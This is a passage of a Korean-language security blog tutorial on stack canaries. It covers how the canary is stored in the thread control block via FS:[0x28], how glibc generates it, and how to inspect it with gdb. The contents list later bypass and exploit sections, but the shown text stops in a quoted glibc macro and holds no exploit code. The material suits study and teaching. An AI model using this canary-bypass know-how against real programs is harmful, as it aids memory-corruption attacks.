<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> System Hacking Step 6-1 - TouBVa </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Stack Canary and How to Bypass It- System Hacking Step 6-1"> <meta name="keywords" content="System Hacking Step 6-1, TouBVa, dreamhack_system_hacking,System Hacking, Stack Canary"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="TouBVa" property="og:site_name" /> <meta content="System Hacking Step 6-1" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Stack Canary and How to Bypass It" property="og:description" /> <meta content="http://localhost:4000/blog/dreamhack_system_hacking/step6-1" property="og:url" /> <meta content="2023-01-08T22:44:23+09:00" property="article:published_time" /> <meta content="http://localhost:4000/about/" property="article:author" /> <meta content="http://localhost:4000/assets/img/posts/sys6/Untitled%2022.jpeg" property="og:image" /> <meta content="dreamhack_system_hacking" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="System Hacking Step 6-1" /> <meta name="twitter:url" content="http://localhost:4000/blog/dreamhack_system_hacking/step6-1" /> <meta name="twitter:description" content="Stack Canary and How to Bypass It" /> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css" /> <!-- <link rel="stylesheet" href="http://localhost:4000/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="http://localhost:4000/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = 'http://localhost:4000' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="http://localhost:4000/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="http://localhost:4000/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="http://localhost:4000/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="http://localhost:4000/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="http://localhost:4000/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="http://localhost:4000/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="http://localhost:4000/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="http://localhost:4000/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="http://localhost:4000/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="http://localhost:4000/assets/js/search.js"></script> <script src="http://localhost:4000/assets/js/on-scroll-progress.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark nav-down" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">TouBVa</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/about" >About</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/contact" >Contact</a > </li> </ul> </div> <ul class="nav justify-content-end"> <!-- <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/styleguide"> Styleguide </a> </li>--> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <!-- <li class="nav-item" style="margin-top:5px; padding-right:20px;" > <a class="header__checkout snipcart-checkout"> <svg width="31" height="27" viewBox="0 0 31 27" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1.10512 0.368718C0.560256 0.368718 0.118164 0.812066 0.118164 1.35848C0.118164 1.9049 0.560256 2.34824 1.10512 2.34824H4.90887L8.30138 18.4009C8.43503 19.0053 8.83085 19.5079 9.32946 19.5041H25.7788C26.3005 19.5118 26.7799 19.0375 26.7799 18.5143C26.7799 17.9911 26.3006 17.5168 25.7788 17.5245H10.1315L9.71003 15.545H27.095C27.5371 15.5412 27.9547 15.2048 28.0511 14.7718L30.354 4.87412C30.4825 4.29933 29.9852 3.67172 29.3979 3.66786H7.21171L6.6771 1.15221C6.58329 0.71276 6.15921 0.368652 5.7107 0.368652L1.10512 0.368718ZM7.623 5.64746H12.7634L13.2569 8.61674H8.25005L7.623 5.64746ZM14.7785 5.64746H20.9881L20.4946 8.61674H15.2719L14.7785 5.64746ZM23.0031 5.64746H28.1537L27.4649 8.61674H22.5097L23.0031 5.64746ZM8.67181 10.5963H13.5862L14.0797 13.5656H9.29919L8.67181 10.5963ZM15.6009 10.5963H20.1656L19.6721 13.5656H16.0944L15.6009 10.5963ZM22.1807 10.5963H27.0023L26.3135 13.5656H21.6872L22.1807 10.5963ZM12.6197 20.164C10.8141 20.164 9.32979 21.6525 9.32979 23.4632C9.32979 25.2739 10.8141 26.7624 12.6197 26.7624C14.4252 26.7624 15.9095 25.2739 15.9095 23.4632C15.9095 21.6525 14.4252 20.164 12.6197 20.164ZM22.4892 20.164C20.6837 20.164 19.1994 21.6525 19.1994 23.4632C19.1994 25.2739 20.6837 26.7624 22.4892 26.7624C24.2948 26.7624 25.7791 25.2739 25.7791 23.4632C25.7791 21.6525 24.2948 20.164 22.4892 20.164ZM12.6197 22.1435C13.3586 22.1435 13.9356 22.7222 13.9356 23.4632C13.9356 24.2042 13.3586 24.7829 12.6197 24.7829C11.8807 24.7829 11.3037 24.2042 11.3037 23.4632C11.3037 22.7222 11.8807 22.1435 12.6197 22.1435ZM22.4892 22.1435C23.2282 22.1435 23.8052 22.7222 23.8052 23.4632C23.8052 24.2042 23.2282 24.7829 22.4892 24.7829C21.7503 24.7829 21.1733 24.2042 21.1733 23.4632C21.1733 22.7222 21.7503 22.1435 22.4892 22.1435Z" fill="#ff7901" class="header__checkout-fill"></path> </svg> <span class="snipcart-items-count"></span> </a> </li> --> </ul> </nav> <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> <script type="text/javascript"> var didScroll; var lastScrollTop = 0; var delta = 5; var navbarHeight = document.querySelector('#topNav').offsetHeight; window.addEventListener('scroll', function(event) { didScroll = true; }); setInterval(function() { if (didScroll) { hasScrolled(); didScroll = false; } }, 250); function hasScrolled() { var st = window.pageYOffset || document.documentElement.scrollTop; if (Math.abs(lastScrollTop - st) <= delta) return; var nav = document.querySelector('#topNav'); var prog = document.querySelector('#progress-bar'); if (st > lastScrollTop && st > navbarHeight) { nav.classList.remove('nav-down'); nav.classList.add('nav-up'); prog.classList.remove('toDown'); prog.classList.add('toUp'); } else { if (st < lastScrollTop) { nav.classList.remove('nav-up'); nav.classList.add('nav-down'); prog.classList.remove('toUp'); prog.classList.add('toDown'); } } lastScrollTop = st; } </script> <div id="progress-bar"></div> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="main-container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">System Hacking Step 6-1</h1> <h4 class="post-meta">Stack Canary and How to Bypass It</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="http://localhost:4000/blog/authors/TouBVa">TouBVa</a></span> </span > at <time datetime="2023-01-08 22:44:23 +0900" itemprop="datePublished" >Jan 8, 2023</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/dreamhack_system_hacking/step6-1" ></span> <div class="post-categories"> Category : <a href="/blog/categories/dreamhack_system_hacking" >dreamhack_system_hacking</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top" src="http://localhost:4000/assets/img/posts/sys6/Untitled%2022.jpeg" alt="" /> <br /> <br /> <ul id="markdown-toc"> <li><a href="#0-스택-카나리란" id="markdown-toc-0-스택-카나리란">0. 스택 카나리란?</a></li> <li><a href="#1-카나리의-작동-원리" id="markdown-toc-1-카나리의-작동-원리">1. 카나리의 작동 원리</a> <ul> <li><a href="#11-카나리-비활성화-활성화-비교" id="markdown-toc-11-카나리-비활성화-활성화-비교">1.1. 카나리 비활성화-활성화 비교</a> <ul> <li><a href="#111-카나리-비활성화의-경우" id="markdown-toc-111-카나리-비활성화의-경우">1.1.1. 카나리 비활성화의 경우</a></li> <li><a href="#112-카나리-활성화의-경우" id="markdown-toc-112-카나리-활성화의-경우">1.1.2. 카나리 활성화의 경우</a></li> </ul> </li> <li><a href="#12--어셈블리-비교-분석-프롤로그와-에필로그의-차이" id="markdown-toc-12--어셈블리-비교-분석-프롤로그와-에필로그의-차이">1.2. 어셈블리 비교-분석; 프롤로그와 에필로그의 차이</a> <ul> <li><a href="#121-fs가-대체-뭐야" id="markdown-toc-121-fs가-대체-뭐야">1.2.1. FS가 대체 뭐야?</a></li> <li><a href="#122-gdb로-tcb의-스택-카나리-직접-확인하기" id="markdown-toc-122-gdb로-tcb의-스택-카나리-직접-확인하기">1.2.2. gdb로 TCB의 스택 카나리 직접 확인하기</a></li> </ul> </li> </ul> </li> <li><a href="#2-카나리-생성-과정-분석" id="markdown-toc-2-카나리-생성-과정-분석">2. 카나리 생성 과정 분석</a> <ul> <li><a href="#21-fs와-tls의-연결과정-추적" id="markdown-toc-21-fs와-tls의-연결과정-추적">2.1. fs와 TLS의 연결과정 추적</a></li> <li><a href="#22-스택-카나리의-저장-과정-추적" id="markdown-toc-22-스택-카나리의-저장-과정-추적">2.2. 스택 카나리의 저장 과정 추적</a></li> <li><a href="#23-main에서-사용되는-스택-카나리-확인" id="markdown-toc-23-main에서-사용되는-스택-카나리-확인">2.3. main에서 사용되는 스택 카나리 확인</a></li> </ul> </li> <li><a href="#3-카나리-우회" id="markdown-toc-3-카나리-우회">3. 카나리 우회</a> <ul> <li><a href="#31-brute-force" id="markdown-toc-31-brute-force">3.1. Brute Force</a></li> <li><a href="#32-tls-접근-canary-leak" id="markdown-toc-32-tls-접근-canary-leak">3.2. TLS 접근-Canary Leak</a></li> </ul> </li> <li><a href="#4-카나리-우회-실습" id="markdown-toc-4-카나리-우회-실습">4. 카나리 우회 실습</a> <ul> <li><a href="#41-코드-분석" id="markdown-toc-41-코드-분석">4.1. 코드 분석</a></li> <li><a href="#42-익스플로잇-구성" id="markdown-toc-42-익스플로잇-구성">4.2. 익스플로잇 구성</a></li> <li><a href="#43-익스플로잇-실행" id="markdown-toc-43-익스플로잇-실행">4.3. 익스플로잇 실행</a></li> </ul> </li> <li><a href="#번외-삽질이-남긴-지식" id="markdown-toc-번외-삽질이-남긴-지식">번외: 삽질이 남긴 지식</a> <ul> <li><a href="#1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다" id="markdown-toc-1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다">1. 와! 리눅스 대상 분석을 하는데 윈도우 프로세스 관리를 가져왔다?!?</a></li> <li><a href="#" id="markdown-toc-"><br /></a></li> </ul> </li> </ul> <p><br /></p> <h1 id="0-스택-카나리란">0. 스택 카나리란?</h1> <p><br /></p> <blockquote> <p>스택 버퍼 오버플로우를 방어하기 위한 기법으로, 스택 버퍼와 반환 주소 사이에 임의로 생성된 값을 삽입하여 함수의 에필로그에서 해당 값의 변조를 확인하는 보호 기법 카나리 값의 변조가 확인되면 프로세스는 강제로 종료된다.</p> </blockquote> <p><br /></p> <p><br /></p> <h1 id="1-카나리의-작동-원리">1. 카나리의 작동 원리</h1> <p><br /></p> <h2 id="11-카나리-비활성화-활성화-비교">1.1. 카나리 비활성화-활성화 비교</h2> <p><br /></p> <p>스택 카나리를 비활성화하는 옵션은 아래와 같다.</p> <p><code class="language-plaintext highlighter-rouge">-fno-stack-protector</code></p> <p><br /></p> <h3 id="111-카나리-비활성화의-경우">1.1.1. 카나리 비활성화의 경우</h3> <p><br /></p> <p>해당 옵션을 줘서 스택 카나리가 꺼진 프로그램을 실행해 스택 버퍼 오버플로우를 일으켜 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled.jpeg" alt="Untitled" /></p> <p>SEGFAULT가 뜨면서 프로그램 작동이 멈춘다. 당연하다. 버퍼에게 할당된 범위를 넘어서는 길이의 입력값을 줬는데, 그 입력값이 RET addr를 오염시킬 정도의 길이였기 때문이다.</p> <p><br /></p> <h3 id="112-카나리-활성화의-경우">1.1.2. 카나리 활성화의 경우</h3> <p><br /></p> <p>그렇다면 해당 옵션을 주지 않고 <code class="language-plaintext highlighter-rouge">gcc -o</code> 옵션만으로 빌드해 스택 버퍼 오버플로우를 시도해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%201.jpeg" alt="Untitled" /></p> <p>직전의 카나리가 비활성화된 경우와 비교했을 때, ‘stack smashing detected; terminated’, ‘Aborted’ 메시지가 뜨며 프로세스가 강제 종료된 것을 확인할 수 있다. 스택 카나리가 변조된 것이 탐지되어 시스템에서 강제로 프로세스를 종료한 것이다.</p> <p><br /></p> <h2 id="12--어셈블리-비교-분석-프롤로그와-에필로그의-차이">1.2. 어셈블리 비교-분석; 프롤로그와 에필로그의 차이</h2> <p><br /></p> <p>그렇다면 카나리를 켜고/끔에 따른 컴파일 결과는 어떻게 다를까. pwndbg를 통해 함수의 프롤로그와 에필로그를 비교해 보았다.</p> <p>카나리를 켠 버전의 디스어셈블 결과:</p> <p><img src="/assets/img/posts/sys6/Untitled%202.jpeg" alt="Untitled" /></p> <p>카나리를 끈 버전의 디스어셈블 결과:</p> <p><img src="/assets/img/posts/sys6/Untitled%203.jpeg" alt="Untitled" /></p> <p>둘을 비교한 결과, <strong>함수의 프롤로그와 에필로그에서 카나리를 켠 버전에 추가된 부분</strong>이 눈에 띄었다.</p> <p>먼저 <strong>프롤로그</strong>에 추가된 부분을 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%204.jpeg" alt="Untitled" /></p> <p>FS레지스터로부터 8byte 주소를 가져온다.</p> <p><br /></p> <h3 id="121-fs가-대체-뭐야">1.2.1. FS가 대체 뭐야?</h3> <p><br /></p> <p>사실 나는 더 깊은 공부를 위해 이 커리큘럼을 따라가고 있는지라, 이 절의 내용은 스택 카나리를 저장하는 구조체의 역사와 그것이 참조되는 상황의 관행에 대해 다루고 있다. 또한 스택 카나리를 가져올 때의 참조는 관행적 상황이 아니라는 말 또한 덧붙이고 있다.</p> <p>따라서 스택 카나리에 대해서 Overview를 하고픈 사람들에게는 이 절을 읽는 것을 추천하지 않는다.</p> <p>64bit 프로세스에서는 FS:[0x28], 32bit 프로세스에서는 GS:[0x14]가 스택 카나리를 저장하고 있다.</p> <p>그런데 왜? 왜 그렇게 정해졌을까? 의문이 든다. 그 이유를 서술하기 위해 TCB와 PCB에 대해 약간의 설명을 한 후, TCB의 어디에 무엇이 스택 카나리를 저장하는지에 대해 설명하는 것이 좋을 듯 하다.</p> <p><br /></p> <p>먼저 <strong>PCB가 나온 배경</strong>을 알아보고, <strong>PCB 안에 무엇이 왜 저장되는지</strong>에 대해 알아보자.</p> <p>어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 <strong>프로세스 스케줄링(Process Scheduling)</strong>을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.</p> <p>이때, Time Sharing의 특성으로 인해 특정 <strong>프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황</strong>이 생긴다. 이럴 경우:</p> <p>프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는</p> <p>일련의 기능이 보장되어야 한다.</p> <p><br /></p> <p>이와 같이 프로세스와 쓰레드의 실행 컨텍스트를 저장하기 위해 윈도우는 <code class="language-plaintext highlighter-rouge">EPROCESS(PCB)-KPROCESS(PEB)</code>와 <code class="language-plaintext highlighter-rouge">ETHREAD(TCB)-KTHREAD(TEB)</code>라는 구조체를 사용하지만, 리눅스는 <code class="language-plaintext highlighter-rouge">task_struct(PCB)</code> 와 <code class="language-plaintext highlighter-rouge">thread_info(TCB)</code> 라는 구조체를 사용한다. 상호간에 기능 자체는 유사하지만, 윈도우의 리눅스 시스템의 구조가 너무나도 다르기 때문에 상호 대체재로 보지는 않는다.</p> <ul> <li>PCB: Process Control Block</li> <li>PEB: Process Environment Block</li> <li>TCB: Thread Control Block</li> <li>TEB: Thread Environment Block</li> </ul> <p><br /></p> <p>이제 <strong>프로세스에서 TCB가 refer 되는 상황</strong>에 대해 알아보자. 프로세스는 실행 효율성을 올리기 위해 자원을 공유한 채로 작업을 다중화하는데, 이렇게 다중화된 작업 하나하나를 쓰레드라고 한다. 그리고 이런 쓰레드의 실행 컨텍스트를 저장하는 것을 TCB라 부른다. 보통은 프로세스에서 TCB에 접근하면 PCB의 주소를 알아내려고 하는 경우가 많다(윈도우의 경우 TEB에 접근해 PEB 구조체의 시작 주소를 알아낸다).</p> <p>그리고 <strong>리눅스의 TCB, 윈도우의 TEB를 가리키는 것으로 애초에 예약된 레지스터가 바로 FS 레지스터</strong>이다.(정확히는 TLS, Thread Local Storage를 참조해 TCB/TEB에 있는 정보 중 필요한 것을 알아낸다) 다만, 리눅스는 32bit 프로그램에서는 GS, 64bit에서는 FS 레지스터가 TEB를 가리킨다.</p> <p>그럼 지금쯤 궁금증이 생길 것이다. 그래서, 저기 위의 스택 카나리를 가져오는 부분에서 FS[0x28]을 썼으니 TCB를 참조한 것일 텐데… 그럼 PCB에 접근하려고 한 건가?</p> <p>아니다.</p> <p>이제까지 열심히 설명해 놓고 이렇게 말하려니 멋쩍다. 하지만 이제껏 설명한 건 FS 레지스터가 무조건 가리키는 대상인 TCB에 대해 설명하다 보니, TCB를 참조하는 행위가 PCB의 시작 주소를 알아내려는 목적으로 관행적으로 사용된다는 요지의 배경 설명이다.</p> <p><br /></p> <p><strong>강조해 말하자면, 스택 카나리를 찾아오려 FS를 이용해 TCB에 접근하는 행위는 PCB의 시작 주소를 알기 위해 TCB에 접근하는 행위가 아니다.</strong></p> <p>깃허브의 glibc 레포지토리를 확인해 보면, <a href="https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/nptl/sysdeps/i386/tls.h#L44">TCB의 헤더 구조체</a>를 확인할 수 있다. 그곳에 있는 <code class="language-plaintext highlighter-rouge">stack_guard</code> 에 넣을 값을 생성하는 함수는 <code class="language-plaintext highlighter-rouge">_dl_setup_stack_chk_guard</code> 로, <a href="https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/sysdeps/generic/dl-osinfo.h#L23">내부 매커니즘을 들여다보면</a> 무조건 최하위 1byte가 NULL인 8byte 랜덤값이 생성됨을 알 수 있다. 즉, glibc를 이용해 컴파일된 모든 프로그램의 스택 카나리는 최하위 1byte가 NULL일 것이다.</p> <p>이렇게 생성된 스택 카나리 값은 TCB 구조체의 <code class="language-plaintext highlighter-rouge">stack_guard</code> 항목에 저장된다. <code class="language-plaintext highlighter-rouge">stack_guard</code> 변수의 위치가 32bit에서는 TCB의 베이스 기준 0x14의 오프셋을 가지고 있고, 64bit에서는 0x28의 오프셋을 가지고 있기 때문에 리눅스 시스템에서 돌아가는 <strong>ELF 확장자 파일의 64bit 버전에서는 FS:[0x28], 32bit 버전에서는 GS:[0x14]가 스택 카나리를 저장</strong>하게 되는 것이다.</p> <p>(리눅스에서 fs+0x28만 스택 카나리를 저장하는 게 아니다. 컴파일된 비트 버전에 따라 TLS-내부에 TCB가 있다-를 전담하는 레지스터가 달라진다. gdb를 붙여 64비트 버전과 32비트 버전을 비교하면 쉽게 확인할 수 있다)</p> <p><br /></p> <h3 id="122-gdb로-tcb의-스택-카나리-직접-확인하기">1.2.2. gdb로 TCB의 스택 카나리 직접 확인하기</h3> <p><br /></p> <p>gdb에서는 <code class="language-plaintext highlighter-rouge">info reg system</code> 명령어를 통해 <code class="language-plaintext highlighter-rouge">fs_base</code>와 <code class="language-plaintext highlighter-rouge">gs_base</code> 등의 시스템 레지스터 내역을 출력할 수 있다. 단순히 <code class="language-plaintext highlighter-rouge">info reg</code> 를 통해 얻을 수 있는 레지스터들의 목록에는 표시되지 않는 레지스터들이 출력되니 중요한 명령어다.</p> <p><img src="/assets/img/posts/sys6/Untitled%205.jpeg" alt="Untitled" /></p> <p>현재 분석 대상 프로그램은 64비트로 컴파일되었으므로, fs 레지스터가 TCB 구조체를 refer할 것이다. 추측컨대, <code class="language-plaintext highlighter-rouge">fs_base</code>는 TCB 구조체의 시작 주소를 항상 가지고 있는 게 아닐까 싶다… <code class="language-plaintext highlighter-rouge">fs:[{hex}]</code>일 땐 <code class="language-plaintext highlighter-rouge">fs_base+hex</code> 를 참조하는 것 같고.</p> <p>아무튼, TCB 구조체 시작 주소의 심볼이 fs_base인 것을 알았으니 이제 스택 카나리가 저장된 <code class="language-plaintext highlighter-rouge">FS:[0x28]</code>에 접근해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%206.jpeg" alt="Untitled" /></p> <p>LSB가 NULL인 값이 나온다. 확실히 스택 카나리의 포맷에 맞는다.</p> <p><img src="/assets/img/posts/sys6/Untitled%207.jpeg" alt="Untitled" /></p> <p>그리고 실제로 <code class="language-plaintext highlighter-rouge">FS:[0x28]</code>에 접근해 rax에 스택 카나리를 복사해 넣는 인스트럭션이 진행된 후의 rax 값과 동일하다. 즉, 스택 카나리 값에 성공적으로 접근했다!</p> <p>이제까지 프롤로그에 추가된 부분을 확인해 보았다. 다음으로 <strong>에필로그에 추가</strong>된 부분을 분석해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%208.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">read</code> 함수를 부른 이후 eax를 정리하는 과정 바로 다음에 추가된 4줄의 인스트럭션이다.</p> <p>함수의 에필로그에서 저장되었던 스택 카나리를 불러와 TCB에 저장된 원본 스택 카나리와 xor 한다. 즉, 같은지 확인한다. 그 결과 같다면, 즉 xor 결과가 0이기 때문에 ZF가 1으로 세팅된다면 함수를 정상적으로 종료하도록 한다<sup id="fnref:je" role="doc-noteref"><a href="#fn:je" class="footnote" rel="footnote">1</a></sup>. 그러나 만일 다르다면 <code class="language-plaintext highlighter-rouge">_stack_chk_fail</code> 함수를 콜하게 된다.</p> <p><img src="/assets/img/posts/sys6/Untitled%201.jpeg" alt="Untitled" /></p> <p>앞서 보았던 이 메시지를 출력하는 함수가 바로 <code class="language-plaintext highlighter-rouge">_stack_chk_fail</code> 함수이다.</p> <p><br /></p> <p><br /></p> <h1 id="2-카나리-생성-과정-분석">2. 카나리 생성 과정 분석</h1> <p><br /></p> <p>앞서 말한 분석 내용을 정리하자면 다음과 같다.</p> <blockquote> <p>카나리 값은 프로세스가 시작될 때 TLS(Thread Local Space) 내부에 존재하는 TCB(Thread Control Block)<sup id="fnref:TCBTLS" role="doc-noteref"><a href="#fn:TCBTLS" class="footnote" rel="footnote">2</a></sup>에 전역 변수로 저장되고, 컴파일러는 각 함수마다 프롤로그와 에필로그에서 이 값을 참조하도록 한다.</p> </blockquote> <p>그렇다면, 정확히 카나리 값이 TCB에 저장되는 과정은 무엇일까? 이번 섹션에서는 그 과정을 하나씩 따라가 볼 것이다.</p> <p>카나리가 생성되어 저장되기까지의 과정을 큼직하게 나누어 보면 아래와 같다.</p> <blockquote> <p>프로세스 시작 → TLS 할당 → fs의 base값 지정 → 이후 fs를 이용한 TCB 접근 → 스택 카나리 저장</p> </blockquote> <p>따라서, 먼저 fs의 base값이 어떻게 TLS와 연결되는지부터 확인해 보자.</p> <p><br /></p> <h2 id="21-fs와-tls의-연결과정-추적">2.1. fs와 TLS의 연결과정 추적</h2> <p><br /></p> <p>사실 TLS가 할당되고, FS 레지스터의 값을 TLS 구조체와 연결되도록 변경하는 과정에 대해서는 이 <a href="https://chao-tic.github.io/blog/2018/12/25/tls">포스트</a>가 정말 잘 서술해 놨다. 해당 포스트에서 이 섹션에 필요한 내용만 조금 발췌해 서술하면 아래와 같다.</p> <p><br /></p> <p>x86-64 커널에서는 FS에 저장되는 주소가 MSR(Model Specific Register; <code class="language-plaintext highlighter-rouge">MSR_FS_BASE</code>)에 의해 관리된다<sup id="fnref:MSR" role="doc-noteref"><a href="#fn:MSR" class="footnote" rel="footnote">3</a></sup>. 그리고 이러한 작용을 유저 프로세스가 커널에 요청할 수 있도록 시스템이 제공하는 system call이 바로 <code class="language-plaintext highlighter-rouge">arch_prctl</code> 이다.</p> <p><br /></p> <p>즉, <code class="language-plaintext highlighter-rouge">arch_prctl</code> 시스콜이 call 되는 시점에 프로세스를 중지하고 컨텍스트를 들여다 보면 FS 값이 어떻게 변화하는지, 지정된 <code class="language-plaintext highlighter-rouge">fs_base</code>는 무엇인지 알 수 있을 것이다.</p> <p>gdb에는 특정 행위가 발생했을 때 곧바로 프로세스 흐름을 중단하는 <code class="language-plaintext highlighter-rouge">catch</code> 라는 명령어가 있다. 해당 명령어를 이용해 <code class="language-plaintext highlighter-rouge">arch_prctl</code> 시스콜이 발생하는 지점을 찾아보자. (이런 식으로 설정된 정지 지점은 breakpoint로 취급되기 때문에 <code class="language-plaintext highlighter-rouge">info b</code> 명령어로 리스트를 뽑아 볼 수 있다)</p> <p><img src="/assets/img/posts/sys6/Untitled%209.jpeg" alt="Untitled" /></p> <p>이제 <code class="language-plaintext highlighter-rouge">r</code> 명령어로 프로그램을 실행해 보자. 플로우가 멈췄을 때의 콜스택은 아래와 같다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2010.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">arch_prctl</code> 이 요청되고 나서 해당 요청을 수행하기 위한 과정의 초입이다. <code class="language-plaintext highlighter-rouge">n</code> 명령어로 쭉 따라가 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2011.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">init_tls</code> 함수가 콜된 상황이다. 이 시점에서 해당 함수의 내부에 정의된 <code class="language-plaintext highlighter-rouge">__tls_init_tp</code> 매크로가 실행된다.</p> <p>그렇다면 <code class="language-plaintext highlighter-rouge">__tls_init_tp</code> 매크로는 어떤 기능을 할까?</p> <p><strong><code class="language-plaintext highlighter-rouge">glibc.git / sysdeps / x86_64 / nptl / tls.h</code></strong> 소스 코드에 정의된 <code class="language-plaintext highlighter-rouge">TLS_INIT_TP</code> 를 보자.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp"># define TLS_INIT_TP(thrdescr) \
  ({ void *_thrdescr = (thrdescr);                                              \
     tcbhead_t *_head = _thrdescr;                                              \
     int _result;                                                              \
                                                                              \
